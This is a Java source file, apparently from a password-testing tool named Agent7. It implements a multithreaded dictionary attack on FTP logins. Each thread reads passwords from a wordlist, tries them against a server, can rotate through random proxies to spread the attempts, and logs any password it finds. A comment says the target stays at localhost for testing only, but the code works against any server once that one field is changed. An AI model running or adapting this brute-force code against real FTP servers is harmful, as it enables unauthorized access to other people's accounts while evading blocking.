package me.dylan.Agent7.Threads;

import java.io.IOException;
import java.net.ConnectException;
import java.net.SocketException;

import me.dylan.Agent7.Agent7;
import me.dylan.Agent7.testModes.TestModeFTPMultiThreadDictionary;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPHTTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class ThreadDictionaryFTP extends ThreadDictionary {
	FTPClient client;
	String username;
	int port;
	int offset = 0;
	/**
	 * This is the ip of the destination server. This is ONLY to be changed from
	 * localhost for testing purposes, anything else, and it can be used with
	 * malicious intent. If you are seeing this, you probably shouldn't be.
	 */
	public static String ip = "localhost";

	public ThreadDictionaryFTP(int offset, int port, String username, TestModeFTPMultiThreadDictionary parent)
			throws IOException {
		super("", offset);
		this.username = username;
		this.port = port;
		setDelayMicroS(1);
	}
	/**
	 * Yes I know it's redundant, but it was
	 * the only way I could make it work.
	 * Any assistance would be appreciated.
	 */
	public void run() {
		while (!this.getVerified() && !this.isInterrupted()) {
			if (getComparisons() + offset < Agent7.instance.resLoader
					.getAllFileContents().size() - 1) {
				setComparisons(getComparisons() + 1);
				// if (comparisons % 1000 == 0) {
				Agent7.logLine("Attempted " + getComparisons() + " Passwords.");
				// }
				setCurrentString(Agent7.instance.resLoader.getAllFileContents()
						.get(getComparisons() + offset));
				updateVerification();
				// if (!currentString.isEmpty())
			} else {
				Agent7.logLine("Your password was not found in our database! Good job!");
				break;
			}
			if (!Agent7.consumeAllPossibleRes) {
				try {
					Thread.sleep(getDelayMiliS(), getDelayMicroS());
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}
	}
	@Override
	public void updateVerification() {
		if(ThreadSyncDictionaryFTP.getFinished())
			this.setVerified(true);
		System.out.println("Currently Testing: "+getCurrentString());
		if (Agent7.fireDrillEnabled) {
			String proxy = Agent7.instance.proxySelector.getRandomProxy();
			Agent7.logLine("Connecting with proxy: " + proxy);
			client = new FTPHTTPClient(proxy.split(":")[0],
					Integer.parseInt(proxy.split(":")[1]));
		} else {
			client = new FTPClient();
		}
		try {
			client.connect(ip, port);
			Agent7.logLine("Connected succesfully!");
		} catch (SocketException e3) {
			// Agent7.err(e3);
			// Agent7.logLine("Could not connect...");
		} catch (IOException e3) {
			// removeProxy(proxy);
			// Agent7.err(e3);
		}
		String proxy = "";
		if (!client.isConnected()) {
			try {

				if (Agent7.fireDrillEnabled) {
					proxy = Agent7.instance.proxySelector.getRandomProxy();
					Agent7.logLine("Connecting with proxy: " + proxy);
					client = new FTPHTTPClient(proxy.split(":")[0],
							Integer.parseInt(proxy.split(":")[1]));
				} else {
					client = new FTPClient();
				}

				// client.setConnectTimeout(3000);
				client.connect(ip, port);
				Agent7.logLine("Connected succesfully!");
			} catch (ConnectException e) {
				Agent7.err(e);
			} catch (IOException e2) {
				Agent7.err(e2);
				/*
				 * removeProxy(proxy);
				 */
				if (client.isConnected()) {
					try {
						client.disconnect();
						if (Agent7.fireDrillEnabled)
							Agent7.instance.proxySelector
									.finishedWithProxy(proxy);
					} catch (IOException e) {
						Agent7.err(e);
					}
					return;
				}
				return;
			}

		}
		if (!client.isConnected())
			return;
		int reply = client.getReplyCode();
		try {
			String pass = this.getCurrentString();
			if (pass.isEmpty()) {
				pass = this.getCurrentString();
			}
			boolean hasLoggedin = client.login(username, pass);
			this.setVerified(hasLoggedin);
			if (this.getVerified() && FTPReply.isPositiveCompletion(reply)) {
				client.enterLocalPassiveMode();
				client.appendFileStream("Proxies.dat");
				client.disconnect();
				Agent7.logLine("FTP Password found!!! Password: "
						+ this.getCurrentString());
				System.out.println("Password found!!! Password: "
						+ this.getCurrentString());
				
				ThreadSyncDictionaryFTP.finish();
			} else {
				// client.logout();
				if (!client.isConnected())
					reconnect();

			}

		} catch (IOException e1) {
			Agent7.logLine("Disconnected by server, attempting reconnect.");
			try {
				reconnect();
			} catch (IOException e) {
				try {
					reconnect();
				} catch (IOException e2) {
					Agent7.err(e2);
				}
				if (Agent7.fireDrillEnabled)
					Agent7.instance.proxySelector.finishedWithProxy(proxy);
				// Agent7.instance.proxySelector.remove(proxy);
				// Agent7.logLine("Removed dead proxy: "+proxy);
				// e.printStackTrace();
			}
		}
		try {
			Thread.sleep(getDelayMiliS(), getDelayMicroS());
		} catch (InterruptedException e) {
			e.printStackTrace();
			this.interrupt();
		}
	}

	public void removeProxy(String proxy) {
		Agent7.instance.proxySelector.remove(proxy);
		Agent7.logLine("Removed dead proxy: " + proxy);
	}

	public void reconnect() throws SocketException, IOException {

		if (Agent7.fireDrillEnabled) {
			String proxy = Agent7.instance.proxySelector.getRandomProxy();
			Agent7.logLine("Connecting with proxy: " + proxy);
			client = new FTPHTTPClient(proxy.split(":")[0],
					Integer.parseInt(proxy.split(":")[1]));
		} else {
			client = new FTPClient();
		}
		client.setConnectTimeout(4000);
		client.setDataTimeout(4000);
		client.connect(ip, port);
	}
}
